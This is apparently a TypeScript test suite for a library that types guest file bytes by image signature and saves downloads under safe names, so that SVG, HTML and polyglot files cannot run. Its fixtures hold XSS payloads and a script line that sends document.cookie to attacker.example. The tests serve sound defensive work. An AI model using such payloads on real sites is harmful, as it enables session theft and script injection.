import { afterEach, describe, expect, it, vi } from 'vitest';
import fc from 'fast-check';
import { FALLBACK_TYPE, FILE_TYPES, FileStore, INERT_TYPES, isValidPath, mimeTypeFor, type FileTypeRow } from '@src/lib/files';
import { createGuestWrites, type GuestWrite, type MintedWrites } from '@src/lib/guest-writes';
import { GUEST_IMAGE_SIGNATURES, GUEST_IMAGE_TYPES, guestBytes, imageTypeOf, SAVED_NAME_SUFFIX, savedName, type GuestBytes, type SignatureByte } from '@src/lib/guest-bytes';
import { RASTER_IMAGE_TYPES } from '@src/lib/in-sandbox-view';
import { commitOverlayAt } from './guest-commit';

/**
 * A guest write's content is a GuestBytes (I9, design 02 "GuestBytes"): a `Blob` the library makes from guest bytes has
 * a type the library chose, and a file it saves a name it chose. image() types a Blob by the bytes' signature
 * (GUEST_IMAGE_SIGNATURES, enumerated here) and never by the path; SVG, HTML and script give null under every extension,
 * and a polyglot behind an image signature is typed as that image and nothing else. save() saves an
 * `application/octet-stream` blob under savedName(), for every row of FILE_TYPES. bytes() is a copy, and a commit stores
 * the entry's bytes whatever the embedder did to a copy.
 */

const ROWS = Object.entries(FILE_TYPES) as [string, FileTypeRow][];
const utf8 = (text: string) => new TextEncoder().encode(text);
const concat = (...parts: Uint8Array[]) => {
    const out = new Uint8Array(parts.reduce((sum, part) => sum + part.length, 0));
    let at = 0;
    for (const part of parts) {
        out.set(part, at);
        at += part.length;
    }
    return out;
};
/** A signature as bytes, each "any byte" filled with `fill`. */
const bytesOf = (signature: readonly SignatureByte[], fill = 0x2a) => Uint8Array.from(signature, byte => byte ?? fill);
/** A Blob's bytes, read as jsdom can (its Blob has no arrayBuffer()). */
const blobBytes = (blob: Blob) => new Promise<Uint8Array>((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = () => resolve(new Uint8Array(reader.result as ArrayBuffer));
    reader.onerror = () => reject(reader.error);
    reader.readAsArrayBuffer(blob);
});

const SIGNATURE_ROWS: [string, readonly (readonly SignatureByte[])[]][] = Object.entries(GUEST_IMAGE_SIGNATURES);
const EVERY_SIGNATURE: [string, number, readonly SignatureByte[]][] = [];
for (const [type, signatures] of SIGNATURE_ROWS) signatures.forEach((signature, i) => EVERY_SIGNATURE.push([type, i, signature]));

/** Bytes of the kinds a browser renders as a document or runs, none an image. */
const DOCUMENTS: Record<string, Uint8Array> = {
    svg: utf8('<svg xmlns="http://www.w3.org/2000/svg"><script>parent.stolen = document.cookie</script></svg>'),
    'svg after a byte order mark': concat(Uint8Array.of(0xef, 0xbb, 0xbf), utf8('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>')),
    'svg after an XML declaration': utf8('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'),
    html: utf8('<!doctype html><title>x</title><script>alert(document.domain)</script>'),
    'html with leading white space': utf8('  \n<html><body onload="alert(1)"></body></html>'),
    script: utf8('fetch("https://attacker.example/?" + document.cookie)'),
    xml: utf8('<?xml version="1.0"?><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>'),
    'an empty file': new Uint8Array(0),
};
/** What a polyglot carries after the image signature. */
const PAYLOADS: Record<string, Uint8Array> = { html: DOCUMENTS.html!, svg: DOCUMENTS.svg!, script: DOCUMENTS.script! };
/** Every extension of the table, an unknown one, and none, in both cases. */
const PATHS: string[] = [];
for (const [extension] of ROWS) PATHS.push(`f.${extension}`, `dir/F.${extension.toUpperCase()}`);
PATHS.push('f.zz', 'noext', '.env');

/** A guest write of `bytes` at `path`, listed by an overlay whose store the test can read. */
function listed(path: string, bytes: Uint8Array | string) {
    const store = new FileStore(() => {});
    const minted: MintedWrites = new WeakMap();
    const writes = createGuestWrites({ store, minted, now: () => 0 });
    writes.handle({ change: 'write', path, entry: bytes });
    const value = writes.list()[0] as Extract<GuestWrite, { change: 'write' }>;
    return { store, writes, minted, value, content: value.content };
}

describe('GUEST_IMAGE_SIGNATURES: one row per type of GUEST_IMAGE_TYPES, each signature enumerated', () => {
    it('the rows are exactly GUEST_IMAGE_TYPES, in order, and those are the raster types the view shows (RASTER_IMAGE_TYPES); SVG is none', () => {
        expect(Object.keys(GUEST_IMAGE_SIGNATURES)).toEqual([...GUEST_IMAGE_TYPES]);
        expect([...GUEST_IMAGE_TYPES].sort()).toEqual([...RASTER_IMAGE_TYPES].sort());
        expect(GUEST_IMAGE_TYPES).not.toContain('image/svg+xml');
        for (const type of GUEST_IMAGE_TYPES) expect(INERT_TYPES.has(type), type).toBe(true);
        for (const [type, signatures] of SIGNATURE_ROWS) expect(signatures.length, type).toBeGreaterThan(0);
    });

    it.each(EVERY_SIGNATURE)('%s, signature %i: it alone, and with anything after it, is that type, whatever fills its open bytes', (type, _, signature) => {
        for (const fill of [0x00, 0x2a, 0xff]) {
            expect(imageTypeOf(bytesOf(signature, fill))).toBe(type);
            expect(imageTypeOf(concat(bytesOf(signature, fill), DOCUMENTS.html!))).toBe(type);
        }
    });

    it.each(EVERY_SIGNATURE)('%s, signature %i: one byte short, or any one fixed byte changed, it is not that type', (type, _, signature) => {
        expect(imageTypeOf(bytesOf(signature).subarray(0, signature.length - 1))).toBe(null);
        signature.forEach((byte, i) => {
            if (byte === null) return;
            const changed = bytesOf(signature);
            changed[i] = byte ^ 0x01;
            expect(imageTypeOf(changed), `byte ${i}`).not.toBe(type);
        });
    });
});

describe('image(): a Blob typed by the signature, never by the path, never SVG', () => {
    it.each(Object.entries(DOCUMENTS))('%s gives null under every extension the table has, an unknown one and none', (_, bytes) => {
        for (const path of PATHS) expect(listed(path, bytes).content.image(), path).toBe(null);
    });

    it('a path named x.png holding HTML gives null: the extension is not a signature', () => {
        const { value, content } = listed('x.png', DOCUMENTS.html!);
        expect(value.type).toBe('image/png'); // the path's type, which the library still reports
        expect(content.image()).toBe(null);
    });

    it.each(EVERY_SIGNATURE)('a polyglot behind the %s signature %i is typed as that image, and only that, under every path; its bytes are the write\'s', async (type, _, signature) => {
        for (const [payload, bytes] of Object.entries(PAYLOADS)) {
            const polyglot = concat(bytesOf(signature), bytes);
            for (const path of [...PATHS, 'evil.svg', 'evil.html', 'evil.js']) {
                const blob = listed(path, polyglot).content.image();
                expect(blob, `${payload} at ${path}`).toBeInstanceOf(Blob);
                expect(blob!.type, `${payload} at ${path}`).toBe(type);
            }
            expect(Array.from(await blobBytes(listed('p.bin', polyglot).content.image()!))).toEqual(Array.from(polyglot));
        }
    });

    it('a Blob answered is never of a type outside GUEST_IMAGE_TYPES, for any bytes at any path', () => {
        fc.assert(fc.property(fc.uint8Array({ maxLength: 24 }), fc.constantFrom(...PATHS), (bytes, path) => {
            const blob = guestBytes(path, bytes).image();
            if (blob === null) return true;
            return (GUEST_IMAGE_TYPES as readonly string[]).includes(blob.type) && blob.type === imageTypeOf(bytes);
        }), { numRuns: 2000 });
    });
});

describe('bytes() and text()', () => {
    it('bytes() is a copy: changing it changes neither the next call nor what a commit stores', () => {
        const { store, writes, minted, content } = listed('a.txt', 'abc');
        const first = content.bytes();
        first.fill(0x7a);
        expect(Array.from(content.bytes())).toEqual([0x61, 0x62, 0x63]);
        expect(content.bytes()).not.toBe(content.bytes());
        expect(commitOverlayAt(writes, minted, ['a.txt'], false)).toEqual(['a.txt']);
        const stored = store.snapshot().find(([path]) => path === 'a.txt')!;
        expect(atob(stored[2])).toBe('abc');
    });

    it('size is the number of bytes', () => {
        expect(listed('a.bin', new Uint8Array(7)).content.size).toBe(7);
        expect(listed('a.txt', 'é').content.size).toBe(2);
    });

    it('text() decodes UTF-8: multi-byte characters, a malformed sequence as U+FFFD, a leading byte order mark dropped', () => {
        expect(listed('a.txt', 'héllo, 世界 🌍').content.text()).toBe('héllo, 世界 🌍');
        expect(listed('a.bin', Uint8Array.of(0x61, 0xff, 0x62)).content.text()).toBe('a�b');
        expect(listed('a.txt', Uint8Array.of(0xef, 0xbb, 0xbf, 0x61)).content.text()).toBe('a');
        expect(listed('a.txt', '').content.text()).toBe('');
    });
});

describe('savedName(): the last segment, kept only when its extension is an inert row of FILE_TYPES', () => {
    it.each(ROWS)('.%s', (extension, row) => {
        const expected = (name: string) => (row.inert ? name : name + SAVED_NAME_SUFFIX);
        for (const name of [`f.${extension}`, `F.${extension.toUpperCase()}`, `a.b.${extension}`]) {
            expect(savedName(name), name).toBe(expected(name));
            expect(savedName(`dir/sub/${name}`), name).toBe(expected(name));
        }
    });

    it.each([
        ['invoice.pdf.exe', 'invoice.pdf.exe.download'],
        ['report.html', 'report.html.download'],
        ['photo.png.html', 'photo.png.html.download'],
        ['evil.html.png', 'evil.html.png'],
        ['out/app.js', 'app.js.download'],
        ['drawing.svg', 'drawing.svg.download'],
        ['archive.tar.gz', 'archive.tar.gz.download'],
        ['README', 'README.download'],
        ['.env', '.env.download'],
        ['.png', '.png.download'],
        ['a.', 'a..download'],
        ['a..png', 'a..png'],
        ['PHOTO.JPG', 'PHOTO.JPG'],
        ["d/it's(1);=&!$*+,@~-_.png", "it's(1);=&!$*+,@~-_.png"],
        ["d/it's(1);=&!$*+,@~-_.html", "it's(1);=&!$*+,@~-_.html.download"],
    ])('%s is saved as %s', (path, name) => {
        expect(isValidPath(path), path).toBe(true);
        expect(savedName(path)).toBe(name);
    });

    it('for any valid path: the last segment, or it with the suffix; kept exactly when the write\'s type is inert', () => {
        const segment = fc.stringMatching(/^[A-Za-z0-9._~!$&'()*+,;=@-]{1,20}$/).filter(s => s !== '.' && s !== '..');
        fc.assert(fc.property(fc.array(segment, { minLength: 1, maxLength: 4 }), (segments) => {
            const path = segments.join('/');
            if (!isValidPath(path)) return true;
            const last = segments[segments.length - 1]!;
            const inert = INERT_TYPES.has(mimeTypeFor(path));
            return savedName(path) === (inert ? last : last + SAVED_NAME_SUFFIX);
        }), { numRuns: 2000 });
    });
});

describe('save(): the library\'s link, the library\'s name, an application/octet-stream blob', () => {
    // jsdom has no object URLs: each test puts its own in, and the originals (absent or not) come back after it
    const { createObjectURL, revokeObjectURL } = URL;
    afterEach(() => {
        vi.restoreAllMocks();
        URL.createObjectURL = createObjectURL;
        URL.revokeObjectURL = revokeObjectURL;
    });

    /** What one save() did: the blobs it made URLs of, the links it clicked, the URLs it revoked, in order. */
    function recordSave(content: GuestBytes) {
        const events: string[] = [];
        const blobs: Blob[] = [];
        const links: { href: string; download: string; connected: boolean }[] = [];
        let next = 0;
        URL.createObjectURL = vi.fn((blob: Blob) => {
            blobs.push(blob);
            events.push('create');
            return `blob:https://host.example/${next++}`;
        });
        URL.revokeObjectURL = vi.fn((url: string) => { events.push(`revoke ${url}`); });
        vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(function (this: HTMLAnchorElement) {
            links.push({ href: this.href, download: this.download, connected: this.isConnected });
            events.push(`click ${this.href}`);
        });
        content.save();
        return { events, blobs, links };
    }

    it.each([...ROWS.map(([extension]) => [`out/f.${extension}`] as const), ['out/f.zz'] as const, ['out/noext'] as const])('%s: one blob typed application/octet-stream holding the write\'s bytes, one link with the library\'s name, clicked out of any document, then its URL revoked', async (path) => {
        const bytes = concat(utf8('<svg onload="alert(1)">'), Uint8Array.of(0, 255));
        const { content } = listed(path, bytes);
        const { events, blobs, links } = recordSave(content);
        expect(blobs).toHaveLength(1);
        expect(blobs[0]!.type).toBe(FALLBACK_TYPE);
        expect(Array.from(await blobBytes(blobs[0]!))).toEqual(Array.from(bytes));
        expect(links).toEqual([{ href: 'blob:https://host.example/0', download: savedName(path), connected: false }]);
        expect(events).toEqual(['create', 'click blob:https://host.example/0', 'revoke blob:https://host.example/0']);
    });

    it('invoice.pdf.exe and report.html are saved as invoice.pdf.exe.download and report.html.download', () => {
        expect(recordSave(listed('invoice.pdf.exe', 'MZ').content).links[0]!.download).toBe('invoice.pdf.exe.download');
        expect(recordSave(listed('docs/report.html', '<script>alert(1)</script>').content).links[0]!.download).toBe('report.html.download');
    });

    it('returns nothing', () => {
        const { content } = listed('a.txt', 'x');
        URL.createObjectURL = vi.fn(() => 'blob:x');
        URL.revokeObjectURL = vi.fn();
        vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {});
        expect(content.save()).toBeUndefined();
    });
});

describe('the values are frozen, and minted with their write', () => {
    it('a write and its content are frozen: no member can be replaced or added', () => {
        'use strict';
        const { value, content } = listed('a.txt', 'abc');
        expect(Object.isFrozen(value)).toBe(true);
        expect(Object.isFrozen(content)).toBe(true);
        expect(() => { (content as any).bytes = () => new Uint8Array(0); }).toThrow(TypeError);
        expect(() => { (content as any).extra = 1; }).toThrow(TypeError);
        expect(Object.keys(content).sort()).toEqual(['bytes', 'image', 'save', 'size', 'text']);
    });

    it('each list() mints a fresh content with its fresh value; each reads the entry\'s bytes', () => {
        const { writes, content } = listed('a.txt', 'abc');
        const again = (writes.list()[0] as Extract<GuestWrite, { change: 'write' }>).content;
        expect(again).not.toBe(content);
        expect(again.text()).toBe(content.text());
    });
});
